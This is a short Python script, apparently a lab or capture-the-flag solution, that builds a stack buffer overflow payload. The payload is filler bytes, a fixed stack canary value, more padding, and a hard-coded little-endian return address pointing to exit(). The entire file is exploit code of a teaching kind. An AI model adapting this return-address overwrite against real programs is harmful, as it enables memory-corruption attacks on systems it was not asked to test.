#! /usr/bin/python

exp = ""

# Fill the buffer and any locals
exp += 16 * 'A'

# Replace the canary
exp += "UUUU"

# Fill the Function args??? and the old base pointer
exp += 12 * 'B'

# 0xf7e337c0: address of exit function
# The exploit must be in litle endian, i.e. reverse the bytes 
exp += "\xc0\x37\xe3\xf7"

print(exp)




